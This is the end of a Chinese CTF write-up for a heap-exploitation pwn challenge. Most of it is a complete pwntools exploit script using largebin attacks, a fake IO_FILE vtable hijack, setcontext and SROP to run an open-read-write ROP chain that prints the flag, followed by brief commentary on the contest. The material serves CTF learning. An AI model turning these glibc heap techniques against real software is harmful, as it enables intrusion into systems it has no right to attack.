以上部分就是本题中比较新颖的点，其他的利用部分都曾经出现过（例如 orw 的具体利用），我在上文也给出了相应的学习文章，这里就不展开来说。这道题在比赛 Break 环境仅仅三个小时的攻击时间中，居然有人做了出来，实在是佩服。我对于这道题的利用尝试了各个方法，调试了一下午才成功解出，虽然在文章中直接写出的是正解的做法，但是在实际做题中我走了不少的弯路。所以希望各位师傅除了看之外，可以尝试着去做做这道题。

### <a class="reference-link" name="EXP"></a>EXP

```
from pwn import *

elf = None
libc = None
file_name = "./pwn"


# context.timeout = 1


def get_file(dic=""):
    context.binary = dic + file_name
    return context.binary


def get_libc(dic=""):
    libc = None
    try:
        data = os.popen("ldd `{``}`".format(dic + file_name)).read()
        for i in data.split('\n'):
            libc_info = i.split("=&gt;")
            if len(libc_info) == 2:
                if "libc" in libc_info[0]:
                    libc_path = libc_info[1].split(' (')
                    if len(libc_path) == 2:
                        libc = ELF(libc_path[0].replace(' ', ''), checksec=False)
                        return libc
    except:
        pass
    if context.arch == 'amd64':
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    elif context.arch == 'i386':
        try:
            libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
        except:
            libc = ELF("/lib32/libc.so.6", checksec=False)
    return libc


def get_sh(Use_other_libc=False, Use_ssh=False):
    global libc
    if args['REMOTE']:
        if Use_other_libc:
            libc = ELF("./libc.so.6", checksec=False)
        if Use_ssh:
            s = ssh(sys.argv[3], sys.argv[1], sys.argv[2], sys.argv[4])
            return s.process(file_name)
        else:
            return remote(sys.argv[1], sys.argv[2])
    else:
        return process(file_name)


def get_address(sh, libc=False, info=None, start_string=None, address_len=None, end_string=None, offset=None,
                int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if libc == True:
        return_address = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
    elif int_mode:
        return_address = int(sh.recvuntil(end_string, drop=True), 16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].ljust(8, '\x00'))
    elif context.arch == 'amd64':
        return_address = u64(sh.recvuntil(end_string, drop=True).ljust(8, '\x00'))
    else:
        return_address = u32(sh.recvuntil(end_string, drop=True).ljust(4, '\x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        log.success(info + str(hex(return_address)))
    return return_address


def get_flag(sh):
    sh.recvrepeat(0.1)
    sh.sendline('cat flag')
    return sh.recvrepeat(0.3)


def get_gdb(sh, gdbscript=None, addr=0, stop=False):
    if args['REMOTE']:
        return
    if gdbscript is not None:
        gdb.attach(sh, gdbscript=gdbscript)
    elif addr is not None:
        text_base = int(os.popen("pmap `{``}`| awk '`{``{`print $1`}``}`'".format(sh.pid)).readlines()[1], 16)
        log.success("breakpoint_addr --&gt; " + hex(text_base + addr))
        gdb.attach(sh, 'b *`{``}`'.format(hex(text_base + addr)))
    else:
        gdb.attach(sh)
    if stop:
        raw_input()


def Attack(target=None, sh=None, elf=None, libc=None):
    if sh is None:
        from Class.Target import Target
        assert target is not None
        assert isinstance(target, Target)
        sh = target.sh
        elf = target.elf
        libc = target.libc
    assert isinstance(elf, ELF)
    assert isinstance(libc, ELF)
    try_count = 0
    while try_count &lt; 3:
        try_count += 1
        try:
            pwn(sh, elf, libc)
            break
        except KeyboardInterrupt:
            break
        except EOFError:
            if target is not None:
                sh = target.get_sh()
                target.sh = sh
                if target.connect_fail:
                    return 'ERROR : Can not connect to target server!'
            else:
                sh = get_sh()
    flag = get_flag(sh)
    return flag


def choice(idx):
    sh.sendlineafter("&gt;&gt; ", str(idx))


def add(size, content):
    choice(1)
    sh.sendlineafter("Size: ", str(size))
    sh.sendlineafter("Content: ", str(content))


def edit(idx, content):
    choice(2)
    sh.sendlineafter("Index: ", str(idx))
    sh.sendlineafter("Content: ", str(content))


def show(idx):
    choice(4)
    sh.sendlineafter("Index: ", str(idx))


def delete(idx):
    choice(3)
    sh.sendlineafter("Index: ", str(idx))


def pwn(sh, elf, libc):
    context.log_level = "debug"
    add(0x418, '0')
    add(0x418, '1')
    add(0x428, '2')
    add(0x428, '3')
    delete(2)
    add(0x450, '4')
    show(2)
    libc_base = get_address(sh, True, info="libc_base:\t", offset=-0x1e3ff0)

    free_hook_addr = libc_base + 0x1e6e40
    setcontext_addr = libc_base + 0x53030
    main_arena_addr = libc_base + 0x1e3ff0
    global_max_fast = libc_base + 0x1e6e98
    mpcount = libc_base + 0x1e32d0
    free_hook_ptr_addr = libc_base + 0x1e2ed8
    stderr_addr = libc_base + 0x1e47a0
    IO_str_jumps = libc_base + 0x1e5580

    delete(0)
    edit(2, p64(main_arena_addr) * 2 + p64(0) + p64(stderr_addr - 0x20))
    add(0x450, '5')
    show(2)
    heap_base = u64(sh.recvuntil('\n', drop=True)[-6:].ljust(8, '\x00')) - 0x2b0
    log.success("heap_base:\t" + hex(heap_base))

    # recover
    edit(2, p64(heap_base + 0x2b0) + p64(main_arena_addr) + p64(heap_base + 0x2b0) + p64(heap_base + 0x2b0))
    edit(0, p64(main_arena_addr) + p64(heap_base + 0xaf0) * 3)

    add(0x418, '6')
    add(0x428, '7')

    add(0x450, '8')
    add(0x450, '9')
    add(0x450, '10')
    delete(8)
    delete(9)
    delete(10)

    delete(7)
    add(0x450, '11')
    edit(7, p64(main_arena_addr) * 2 + p64(0) + p64(mpcount - 0x20) + 'a' * 0x30 + p64(free_hook_addr))
    delete(6)
    add(0x450, '12')

    # recover
    # edit(7, p64(heap_base + 0x2b0) + p64(main_arena_addr) + p64(heap_base + 0x2b0) + p64(heap_base + 0x2b0))
    # edit(6, p64(main_arena_addr) + p64(heap_base + 0xaf0) * 3)

    new_size = 0x1592
    old_blen = (new_size - 100) // 2
    fake_IO_FILE = 2 * p64(0)
    fake_IO_FILE += p64(1)  # change _IO_write_base = 1
    fake_IO_FILE += p64(0xffffffffffff)  # change _IO_write_ptr = 0xffffffffffff
    fake_IO_FILE += p64(0)
    fake_IO_FILE += p64(heap_base + 0x2080)  # _IO_buf_base
    fake_IO_FILE += p64(heap_base + 0x2080 + old_blen)  # _IO_buf_end
    # old_blen = _IO_buf_end - _IO_buf_base
    # new_size = 2 * old_blen + 100;
    fake_IO_FILE = fake_IO_FILE.ljust(0x78, '\x00')
    fake_IO_FILE += p64(heap_base) # change _lock = writable address
    fake_IO_FILE = fake_IO_FILE.ljust(0xB0, '\x00')
    fake_IO_FILE += p64(0)  # change _mode = 0
    fake_IO_FILE = fake_IO_FILE.ljust(0xC8, '\x00')
    fake_IO_FILE += p64(IO_str_jumps + 0x18 - 0x38)  # change vtable

    edit(6, fake_IO_FILE)

    edit(0, '\x01')

    # heap_base + 0x2080

    gadget_addr = libc_base + 0x000000000014b760  #: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
    pop_rdi_addr = libc_base + 0x2858f
    pop_rsi_addr = libc_base + 0x2ac3f
    pop_rdx_addr = libc_base + 0x5216
    pop_rax_addr = libc_base + 0x45580
    syscall_addr = libc_base + 0x611ea

    # SROP
    fake_frame_addr = heap_base + 0x2080
    frame = SigreturnFrame()
    frame.rax = 2
    frame.rdi = fake_frame_addr + 0xF8
    frame.rsi = 0
    frame.rdx = 0x100
    frame.rsp = fake_frame_addr + 0xF8 + 0x10
    frame.rip = pop_rdi_addr + 1  # : ret

    rop_data = [
        pop_rax_addr,  # sys_open('flag', 0)
        2,
        syscall_addr,

        pop_rax_addr,  # sys_read(flag_fd, heap, 0x100)
        0,
        pop_rdi_addr,
        3,
        pop_rsi_addr,
        fake_frame_addr + 0x200,
        syscall_addr,

        pop_rax_addr,  # sys_write(1, heap, 0x100)
        1,
        pop_rdi_addr,
        1,
        pop_rsi_addr,
        fake_frame_addr + 0x200,
        syscall_addr
    ]

    payload = (p64(gadget_addr) + p64(fake_frame_addr) + p64(0) * 2 + p64(setcontext_addr + 61) +
               str(frame)[ 0x28:]).ljust(0xF8, '\x00') + "flag\x00\x00\x00\x00" + p64(0) + flat(rop_data)
    edit(9, payload)

    add(0x430, '13')
    edit(10, 'a' * 0x438 + p64(0x3fe))
    #gdb.attach(sh, "b *__vfprintf_internal+273")
    choice(1)
    sh.sendlineafter("Size: ", str(0x440))
    sh.interactive()


if __name__ == "__main__":
    sh = get_sh()
    flag = Attack(sh=sh, elf=get_file(), libc=get_libc())
    sh.close()
    log.success('The flag is ' + re.search(r'flag`{`.+`}`', flag).group())
```



## 总结

这次比赛的 Break 环节的题目的质量都非常的高，可惜占比很小，虽然从 Writeup 看来有些题目的利用非常的简单。但实际上很大的难度都在于逆向分析上，这里不知道是专家的选择是有意还是无意的，选择的题目都是偏向于 C++ 的或者有混淆的题目，这类题目的逆向难度大，难以找到漏洞利用点。在比赛紧张的气氛下，在比赛 3 小时的时间内完成一题都是非常了不得的。我的解题方法只代表的我个人的一种思路，如果有更好的思路或者非预期的解法，希望各位师傅不要吝啬，可以在评论区分享一下~
